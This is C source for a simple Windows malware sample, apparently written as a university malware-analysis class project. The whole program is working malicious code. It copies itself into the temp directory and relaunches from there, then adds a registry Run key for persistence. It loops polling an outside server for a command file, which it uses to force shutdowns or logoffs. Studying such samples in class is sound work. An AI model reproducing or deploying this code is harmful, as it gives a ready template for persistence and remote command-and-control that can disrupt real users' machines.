/* -------------------------------------------------------------------
 * malwareEjemplo.c
 * version 1.0
 * Copyright (C) 2016  Jose Ricardo Rodriguez Abreu.
 * Facultad de Ciencias,
 * Universidad Nacional Autonoma de Mexico, Mexico.
 *
 * Este programa es software libre; se puede redistribuir
 * y/o modificar en los terminos establecidos por la
 * Licencia Publica General de GNU tal como fue publicada
 * por la Free Software Foundation en la version 2 o
 * superior.
 *
 * Este programa es distribuido con la esperanza de que
 * resulte de utilidad, pero SIN GARANTIA ALGUNA; de hecho
 * sin la garantia implicita de COMERCIALIZACION o
 * ADECUACION PARA PROPOSITOS PARTICULARES. Vease la
 * Licencia Publica General de GNU para mayores detalles.
 *
 * Con este programa se debe haber recibido una copia de la
 * Licencia Publica General de GNU, de no ser asi, visite el
 * siguiente URL:
 * http://www.gnu.org/licenses/gpl.html
 * o escriba a la Free Software Foundation Inc.,
 * 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA.
 * -------------------------------------------------------------------
 */

/**
 * @file malwareEjemplo.c
 * @author Jose Ricardo Rodriguez Abreu
 * @date 18 Sep 2016
 * @brief File containing the first project for the "Malware Analysis"
 * class.
 *
 * Este programa es un malware que intenta duplicarse y generar
 * llamadas al sistema en Windows.
 *
 * @see https://github.com/ricardorodab/malwareEjemplo
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/*
 *
 * Revisamos en que sistema operativo nos encontramos solo
 * si es windows continuamos la ejecucion del programa:
 *
 */

// Windows (32-bit y 64-bit)
#ifdef _WIN32
//#ifdef _WIN64
#define _UNICODE
#include <tchar.h>
#include <windows.h>
#include <wchar.h>
#include <conio.h>
#include <wininet.h>

#define BUFSIZE 1024

/**
 * Funcion que nos regresa el nombre del archivo.
 * @param nombre - Generalmente dada por la ruta de el mismo.
 * @return Un apuntador a la memoria del nombre del archivo.
 */
char* getNombre(char* nombre)
{
 //Buscamos el ultimo "\" para saber donde empieza su vedadero nombre.
  char nombre2[MAX_PATH];
  strcpy(nombre2,nombre);
  int i = 0;
  int j = 0;
  int mark = 0;
  while(j == 0){
    if(nombre2[i] == '\\'){
      mark = i;
    }else if(nombre2[i] == '\0'){
      j = 1;
    }
    i++;
  }
  if(mark != 0){ mark++; }
  //Creamos el nombre en otro arreglo.
  char vddNombre[MAX_PATH];
  for(j = mark; j < i; j++){
    vddNombre[j-mark] = nombre2[j];
  }
  // Todo lo anterior fue para obtener el verdadero nombre.
  // Ahora solo queda guardar en memoria y hacer el return.
  char *ret = (char*) malloc(sizeof(char) * MAX_PATH);
  strcpy(ret,vddNombre);
  return ret;
}


void casoMalicioso(int caso)
{
  switch(caso)
    {
    case 1:
      ExitWindowsEx(EWX_POWEROFF, EWX_FORCE);
      //EWX_REBOOT
      break;
    case 4:
      ExitWindowsEx(EWX_LOGOFF, EWX_FORCE);
      break;
    default:
      printf("Â¿Que paso?\n");
    }
}


/**
 * Consigue parsear la instruccion que se ejecutara y la ejecuta.
 * @param accion - Es la accion a ejecutar..
 */
void ejecutaAccion(char* accion)
{  
  char txt[MAX_PATH];
  strcpy(txt,accion);
  int i;
  for(i = 0; i < strlen(txt); i++){
    if(txt[i] == '\n')
      {
	txt[i] = '\0';
      }       
  }
  char* uno = "APAGAR";
  char* dos = "REINICIAR";
  char* tres = "SUSPENDER";
  char* cuatro = "CERRAR SESION";
  char* cinco = "CALCULADORA";
  
  int ind, linea;
  if(strcmp(txt,uno) == 0 || strcmp(txt,"1") == 0){
    linea = 1;
     }else if(!strcmp(txt,dos) || !strcmp(txt,"2")){
       linea = 2;
     }else if(!strcmp(txt,tres) || !strcmp(txt,"3")){
      linea = 3;
    }else if(!strcmp(txt,cuatro) || !strcmp(txt,"4")){
      linea = 4;
    }else if(!strcmp(txt,cinco) || !strcmp(txt,"5")){
      linea = 5;
    }else{  
      srand(time(NULL));
      linea = (rand()%10)+1;
    }
  casoMalicioso(linea);
}

/**
 * Funcion que se conecta a interner mediante el protocolo HTTP.
 * El nombre de la funcion se le atribuye a el nombre de ejecucion
 * de todos los Jedi atraves de la galaxia.
 *
 * Se conecta al servidor proyecto1.asm.mx y busca el archivo
 * llamado comando.txt que contiene indicaciones del 1 al 10.
 *
 * @return Un apuntador al espacio de memoria en el que se encuentra la lectura del archivo.
 * @see http://blog.differentpla.net/blog/2004/02/26/downloading-from-an-http-server-using-wininet
 */
char* order66(void)
{
  // The first thing that the application
  // needs to do is to initialise WinInet for use by that application
  char lpszAgent[MAX_PATH] = "WinInetGet/0.1";
  HANDLE hInternet ;
  hInternet = InternetOpen(lpszAgent, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);

  // Having initialised the WinInet functions,
  // the next thing we do is connect to a particular server:
  char lpszServerName[MAX_PATH] = "proyecto1.asm.mx";
  INTERNET_PORT nServerPort = INTERNET_DEFAULT_HTTP_PORT;
  //LPCTSTR lpszUserName = NULL;
  //LPCTSTR lpszPassword = NULL;
  //DWORD dwConnectFlags = 0;
  //DWORD dwConnectContext = 0;
  HINTERNET hConnect = InternetConnect(hInternet,
				       lpszServerName,
				       nServerPort,
				       NULL,
				       NULL,
				       INTERNET_SERVICE_HTTP,
				       0,
				       0);
  // The application then needs to form an HTTP request.
  // This is done with the HttpOpenRequest function:
  char lpszVerb[MAX_PATH] = "GET";
  char lpszObjectName[MAX_PATH] = "/comando.txt"; //"/"
  //LPCTSTR lpszVersion = NULL;			// Use default.
  // LPCTSTR lpszReferrer = NULL;		// No referrer.
  //LPCTSTR *lplpszAcceptTypes = NULL;	// Whatever the server wants to give us.
  DWORD dwOpenRequestFlags = INTERNET_FLAG_IGNORE_REDIRECT_TO_HTTP |
    INTERNET_FLAG_IGNORE_REDIRECT_TO_HTTPS |
    INTERNET_FLAG_KEEP_CONNECTION |
    INTERNET_FLAG_NO_AUTH |
    INTERNET_FLAG_NO_AUTO_REDIRECT |
    INTERNET_FLAG_NO_COOKIES |
    INTERNET_FLAG_NO_UI |
    INTERNET_FLAG_RELOAD;
  //DWORD dwOpenRequestContext = 0;
  HINTERNET hRequest = HttpOpenRequest(hConnect,
				       lpszVerb,
				       lpszObjectName,
				       NULL,
				       NULL,
				       NULL,
				       dwOpenRequestFlags,
				       0);
  BOOL bResult = HttpSendRequest(hRequest, NULL, 0, NULL, 0);
  
  DWORD dwInfoLevel = HTTP_QUERY_RAW_HEADERS_CRLF;
  DWORD dwInfoBufferLength = 10;
  BYTE *pInfoBuffer = (BYTE *)malloc(dwInfoBufferLength+1);
  while (!HttpQueryInfo(hRequest, dwInfoLevel, pInfoBuffer, &dwInfoBufferLength, NULL))
    {
      DWORD dwError = GetLastError();
      if (dwError == ERROR_INSUFFICIENT_BUFFER)
	{
	  free(pInfoBuffer);
	  pInfoBuffer = (BYTE *)malloc(dwInfoBufferLength+1);
	}
      else
	{
	  fprintf(stderr, "HttpQueryInfo failed, error = %d (0x%x)\n",
		  GetLastError(), GetLastError());
	  break;
	}
    }
  
  pInfoBuffer[dwInfoBufferLength] = '\0';
  printf("%s", pInfoBuffer);
  free(pInfoBuffer);
  //Leemos el archivo:
  DWORD dwBytesAvailable;
  char *msg = (char*)malloc(MAX_PATH+1);
  while (InternetQueryDataAvailable(hRequest, &dwBytesAvailable, 0, 0))
    {
      BYTE *pMessageBody = (BYTE *)malloc(dwBytesAvailable+1);
      DWORD dwBytesRead;
      BOOL bResult = InternetReadFile(hRequest, pMessageBody,
				      dwBytesAvailable, &dwBytesRead);
      if (!bResult)
	{
	  fprintf(stderr, "InternetReadFile failed, error = %d (0x%x)\n",
		  GetLastError(), GetLastError());
	  break;
	}
      
      if (dwBytesRead == 0)
	break;	// End of File.
      
      pMessageBody[dwBytesRead] = '\0';
      strcpy(msg,pMessageBody);
      printf("ACTIVIDADES MALICIOSAS: %s", msg);
      free(pMessageBody);
    }
  // Nos podriamos detener aqui para ver el trafico
  // Y la peticion HTTP:
  //getch();
  return msg;
}

/**
 * Funcion que revisa que estemos en el directorio tmp
 * nos regresa el valor de 1 o 0 como booleano.
 *
 * @return 1 si estamos en tmp y 0 caso contrario.
 */
int cmplocation(char* nombre)
{
  char tmp[MAX_PATH];
  char loc[MAX_PATH];
  GetCurrentDirectory(sizeof(loc)-1,loc);
  GetTempPath(sizeof(tmp)-1,tmp);
  // Hacemos esto porque la cadena que nos regresa
  // GetCurrent y GetTemp difieren siempre en que uno
  // termina con "\" y el otro no.
  strcat(loc,"\\");
  int bool = strcmp(tmp,loc);
  
  if(bool == 0)
    {
      // Solo pasa esto si esta en tmp asi que
      // desde aqui invocamos las funciones que queremos
      // que el malware ejecute.
      printf("Desde aqui actua. Linea: %d\n",__LINE__);
      while(1){
	char* orden = order66();
	ejecutaAccion(orden);
      }
      return -1;      
    }
  return mueveArchivo(loc,tmp,nombre);
}

/**
 * Funcion que crea el registro que lo hace persistente.
 * @param name - Recibe este parametro para que sea robusto.
 */
int registry_app(char* nombre)
{
  char* name = getNombre(nombre);
  HKEY hKey;
  DWORD dw;
  char sk[MAX_PATH]  = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
  //char sk[MAX_PATH]  = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
  LONG openRes = RegOpenKeyEx(
			      HKEY_CURRENT_USER,
			      //HKEY_CLASSES_ROOT,
			      sk,
			      0,
			      KEY_ALL_ACCESS,
			      &hKey);
  // Revisamos que hayamos abierto correctamente el registro de llaves.
  if (openRes==ERROR_SUCCESS) {
    char loc[MAX_PATH];
    char fil[MAX_PATH];
    // Obtenemos de nuevo el directorio de trabajo:
    GetCurrentDirectory(sizeof(loc)-1,loc);
    // Recordando de nuevo que no agrega "\" se lo agregamos.
    strcat(loc,"\\");

    // Usaba fil y loc para dos cosas diferentes pero lo cambie.
    // y como estaba corto de tiempo y decidi no arriesgarme lo
    // deje asi como esta para evitar posibles errores.
    // "Y pongale aguacate a mi RAM" - Ricardo, 2016.
    strcpy(fil,loc);

    // Concatenamos el nombre de mi archivo con la ruta.
    strcat(fil,name);

    
    LONG createKey = RegSetValueEx(hKey,        // subkey handle
				   "Proyecto01",// Nombre del registro
				   0,           // must be zero
				   1,           // value type
				   (const BYTE *) fil, // pointer to value data
				   sizeof(fil)); // Nike: Just do it!

    // Revisamos que se haya creado correctamente.
    if(createKey == ERROR_SUCCESS)
      {
	/*
	 * Si se crea correctamente regresamos un 1.
	 * printf("Success creating key."); 
	 */
	return 1;	
      }
    // Si no se crea correctamente imprimimos que no se pudo
    // y mandamos un error de aproximacion de la linea de error.
    printf("Error creating key (Aprox linea: %d).",__LINE__);
    return 0;
  } else {
    // Esto se ejecuta al abrir las llaves y tener un error.
    // Si tuvimos error regresamos cero.
    printf("Error opening key (Aprox linea: %d).",__LINE__);
    return 0;
  }
}

/**
 * Esta funcion mueve el archivo desde cualquier lugar
 * hasta la localidad de tmp de Windows.
 * @param origen - Es donde se encuentra actualmente el archivo.
 * @param destino - Es a donde queremos mover (tmp);
 * @return Un 0 si hubo error, 1 en otro caso.
 */
int mueveArchivo(char* origen, char* destino, char* nombre)
{
  char* vddNombre = getNombre(nombre);
  int result;
  strcat(origen,vddNombre);
  strcat(destino,vddNombre);
  printf("Se mueve de %s ---> %s\n",origen,destino);
  result = MoveFileEx(origen,destino,MOVEFILE_WRITE_THROUGH);
  if(result == 0){
    result = MoveFileEx(origen,destino,MOVEFILE_REPLACE_EXISTING);
  }
  return result;
}

/**
 * Funcion que ejecuta un programa exe o un comando.
 * @param nombre - Es el nombre del archivo o el comando.
 */
void ejecutarDeNuevo(char* name)
{
  char* nombre = getNombre(name);
  char tmp[MAX_PATH];
  // El directorio padre del nuevo proceso:
  char tmpPure[MAX_PATH];
  // Volvemos a localizar a %tmp%.
  GetTempPath(sizeof(tmp)-1,tmp);
  strcpy(tmpPure,tmp);
  strcat(tmp,nombre);
  // Magia negra para ejecutar mas cosas:
  STARTUPINFO si;
  PROCESS_INFORMATION pi;
  
  ZeroMemory( &si, sizeof(si) );
  si.cb = sizeof(si);
  ZeroMemory( &pi, sizeof(pi) );
  // Funcion que tome de ejemplo. Original en:
  //  https://goo.gl/8YYFym
  CreateProcess(NULL,   // No module name (use command line)
		tmp,    // Command line
		NULL,   // Process handle not inheritable
		NULL,   // Thread handle not inheritable
		FALSE,  // Set handle inheritance to FALSE
		0,      // No creation flags
		NULL,   // Use parent's environment block
		tmpPure,// Use parent's starting directory
		&si,    // Pointer to STARTUPINFO structure
		&pi );  // Pointer to PROCESS_INFORMATION structure
}

/**
 * Es la unica funciÃ³n que llama
 * el main de nuestro malware en Window.
 * @param argc - Es el nÃºmero de argumentos.
 * @param argv - Nos importa porque contiene el nombre.
 */
void so(int argc, char** argv)
{
  printf("Hola Windows!\n");

  int continuar = cmplocation(argv[0]);
  if(continuar == 0)
    {
      printf("Algo fallo\n");
    }
  else if(continuar == -1)
    {      
      printf("Success!!!\n");
      registry_app(argv[0]);
      int i;
      //getch();
      exit(0);
    }else{
    ejecutarDeNuevo(argv[0]);
  }
  //getch();
  exit(0);
} //Fin de la funcion so de Windows.



// Apple:
#elif __APPLE__
void so(int argc, char** argv)
{
  printf("Hola Apple!\n");  
  exit(0);
}

// Linux:
#elif __linux__
void so(int argc, char** argv)
{
  printf("Hola Linux!\n");
  exit(0);
}

// Unix:
#elif __unix__
void so(int argc, char** argv)
{
  printf("Hola Unix!\n");
  exit(0);
}

// Caso ajeno:
#else
#   error "Unknown compiler"
#endif


int main(int argc, char** argv)
{
  so(argc, argv);
  return 0;
}
